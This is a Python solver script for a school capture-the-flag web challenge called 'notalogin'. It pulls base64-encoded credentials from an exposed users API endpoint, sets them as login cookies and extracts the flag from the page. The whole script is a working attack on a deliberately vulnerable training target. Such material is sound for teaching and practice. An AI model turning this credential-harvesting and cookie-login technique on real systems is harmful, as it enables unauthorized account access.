#!/bin/python3

import os
import requests
from pwn import *
import logging
from base64 import b64decode
import re

logging.disable()

URL = os.environ.get("URL", "http://notalogin.challs.cyberhighschools.it")
if URL.endswith("/"):
    URL = URL[:-1]

regex = re.compile("flag{[^}]*}")
s = requests.session()

res = s.get(f"{URL}/api/users.php")
if not res.ok:
    print("Error, canont retrieve users")
    exit(1)

users = res.json()
try:
    username = b64decode(users[0]["username"]).decode()
    password = b64decode(users[0]["password"]).decode()
except e:
    print("Cannot find credentials")
    exit(2)

s.cookies.set("username", username)
s.cookies.set("password", password)
res = s.get(f"{URL}")
if not res.ok:
    print("Something is wrong with the login")
    exit(3)

flag = regex.findall(res.text)
if len(flag) == 0:
    print("Cannot find the flag")
    exit(4)

print(flag[0])
